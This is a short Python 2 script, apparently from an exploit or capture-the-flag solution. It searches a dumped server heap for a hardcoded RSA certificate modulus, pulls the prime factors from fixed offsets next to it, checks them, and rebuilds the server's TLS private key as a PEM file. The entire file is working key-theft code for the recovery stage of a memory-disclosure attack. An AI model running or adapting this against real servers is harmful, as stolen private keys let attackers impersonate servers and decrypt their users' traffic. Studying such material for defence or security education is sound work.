from Crypto.PublicKey import RSA
from Crypto.Util.number import inverse, bytes_to_long

# openssl x509 -text -noout -in /etc/ssl/certs/ssl-cert-hastur.pem
modulus_hex = """
                    00:ba:0a:e7:63:1f:c9:d3:c3:ab:cb:f0:02:50:02:
                    f8:43:1e:88:c0:1e:d7:c9:98:2e:2d:36:1f:54:16:
                    5c:f5:f0:3f:b0:fa:a5:1f:40:b1:94:4c:56:c8:4a:
                    4a:ab:0d:d7:80:7c:af:05:b5:9d:c6:39:37:24:57:
                    82:8f:60:a7:6d:b8:e4:6c:30:d5:7e:60:23:6b:63:
                    53:b9:bf:e9:97:72:b9:10:82:1b:98:ab:1d:87:0c:
                    18:bf:ec:83:01:e7:d2:9b:07:94:6e:91:49:77:f7:
                    6a:f2:c4:ba:dd:a6:3f:36:bc:33:b6:c1:ad:78:c1:
                    64:13:a7:e1:6e:e6:1f:21:d7:09:42:b9:a5:97:1a:
                    0f:46:67:d9:ac:3d:39:21:ec:6c:c9:dd:3a:50:ed:
                    1b:5b:d8:0d:c1:00:19:d8:f8:99:5b:31:c6:a0:39:
                    a0:0b:5f:0e:8c:98:29:f1:45:0f:9e:d1:ad:a8:7d:
                    9c:53:1e:17:1a:74:96:e6:76:58:60:c4:ae:ce:61:
                    71:79:83:22:de:16:1d:ca:2f:12:31:fd:27:0b:b4:
                    00:4e:c4:22:8d:d1:7e:7a:4f:b4:2f:8b:6b:03:be:
                    91:d6:09:77:1d:83:05:fe:16:49:7a:c8:ad:31:ab:
                    8e:19:8d:f1:df:98:97:e0:eb:cd:0f:13:9d:fc:e2:
                    ea:99
"""
modulus = "".join(map(lambda x: chr(int(x, 16)),
                      modulus_hex.replace(" ", "").replace("\n", "").split(":")))
n = bytes_to_long(modulus)

def generate_key(p, q, e):
    p = long(p)
    q = long(q)
    e = long(e)
    n = p * q
    d = inverse(e, (p-1) * (q-1))
    rsa = RSA.construct((n, e, d, p, q))
    return rsa.exportKey("PEM")

with open("data/dumped-heap", "r") as f:
    heap = f.read()

n_pos = -1
while True:
    n_pos = heap.find(modulus, n_pos + 1)
    if n_pos < 0: break

    der_pos = n_pos - 0x25

    p_pos = n_pos + 0x233 - 0x25
    p_len = 8*16+1
    q_pos = n_pos + 0x2b7 - 0x25
    q_len = 8*16+1

    e = 65537
    p = bytes_to_long(heap[p_pos:p_pos+p_len])
    q = bytes_to_long(heap[q_pos:q_pos+q_len])
    if p*q != n: continue

    pem = generate_key(p, q, e)
    with open("data/dumped-key.pem", "w") as f:
        f.write(pem)

    print "Found"
    exit()

print "Not found"
